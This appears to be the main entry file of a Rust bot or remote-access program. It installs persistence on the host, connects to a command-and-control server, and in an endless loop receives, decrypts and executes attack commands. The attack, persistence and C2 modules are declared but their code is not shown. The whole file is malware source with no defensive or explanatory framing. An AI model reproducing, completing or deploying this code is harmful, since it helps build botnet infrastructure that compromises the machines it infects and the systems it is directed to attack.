mod config;
mod communication;
mod error;
mod persistence;
mod attacks;
mod encryption;
mod utils;

use config::Config;
use communication::connect_to_c2;
use persistence::add_persistence;
use attacks::execute_attack;
use encryption::decrypt_command;
use error::handle_error;
use tokio::runtime::Runtime;

fn main() {
    let config = Config::load();

    add_persistence();

    let rt = Runtime::new().unwrap();
    rt.block_on(async {
        match connect_to_c2(&config).await {
            Ok(mut socket) => {
                loop {
                    let command = match communication::receive_command(&mut socket).await {
                        Ok(cmd) => cmd,
                        Err(e) => {
                            handle_error(e);
                            continue;
                        }
                    };

                    let decrypted_command = match decrypt_command(&command) {
                        Ok(cmd) => cmd,
                        Err(e) => {
                            handle_error(e);
                            continue;
                        }
                    };

                    if let Err(e) = execute_attack(&decrypted_command).await {
                        handle_error(e);
                    }
                }
            }
            Err(e) => handle_error(e),
        }
    });
}
